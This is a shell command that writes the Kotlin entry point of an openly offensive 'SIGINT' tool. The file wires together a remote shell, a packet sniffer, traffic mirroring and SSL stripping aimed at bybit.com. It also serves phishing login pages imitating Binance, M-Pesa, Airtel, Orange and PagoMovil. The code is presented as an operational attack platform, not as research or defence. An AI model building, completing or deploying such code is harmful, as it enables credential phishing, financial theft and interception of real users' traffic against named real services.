cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
package com.fardc.sigint.core

import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.3 (REPORT-ENABLED) boot OK @ ${Instant.now()}")

    val vault = SecurityVault() 
    val port = 7070

    // 1. Instanciation des unités de combat et de renseignement
    val rotator = EncryptionKeyRotator()
    val interceptor = FinCapInterception()
    val resilience = NetworkResilience()
    val remoteShell = RemoteShell(vault)
    val packetSniffer = PacketSniffer()
    val signalJammer = SignalJammer()
    val signalStealth = SignalStealth()
    val trafficMirror = TrafficMirror()
    val sslStripper = SSLStripper()
    val proxyCapture = ProxyInterceptor(vault)
    val universalPhish = UniversalPhish(vault)
    val missionReporter = MissionReporter(vault)

    // 2. Activation des services SIGINT persistants
    rotator.startRotation()
    interceptor.runInterceptionMode()
    resilience.monitorSystem()
    remoteShell.startShell(9090)
    packetSniffer.startSniffing(9999)

    // 3. Lancement du Dashboard et du moteur de capture HQ
    val app = Javalin.create().start(port)
    universalPhish.setup(app)

    println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
    println("📡 MODE UNIVERSEL ACTIF : /login/{binance|mpesa|airtel|orange|pagomovil}")

    // 4. Endpoints tactiques et administratif
    app.get("/status") { ctx ->
        ctx.json(mapOf(
            "status" to "COMBAT_READY", 
            "version" to "2.3-REPORT",
            "uptime" to Instant.now().toString()
        ))
    }

    // Génération du rapport de mission pour l'État-Major
    app.get("/admin/report") { ctx ->
        missionReporter.generateDailyReport()
        ctx.result("📊 [MISSION] Rapport généré avec succès dans le dossier /reports")
    }

    app.get("/attack/bybit/engage") { ctx ->
        val target = "https://www.bybit.com"
        val proxyPort = 8082
        val downgraded = sslStripper.downgradeConnection(target)
        proxyCapture.startIntercept(proxyPort)
        signalStealth.stealthConnect(downgraded, proxyPort)
        ctx.result("🔥 [OFFENSIVE] Chaîne engagée : $downgraded -> Port $proxyPort")
    }

    app.post("/emergency/halt") { ctx ->
        proxyCapture.stop()
        Gatekeeper().validateAccess("EmergencyStop")
        KillSwitch().engage()
    }
}
EOF
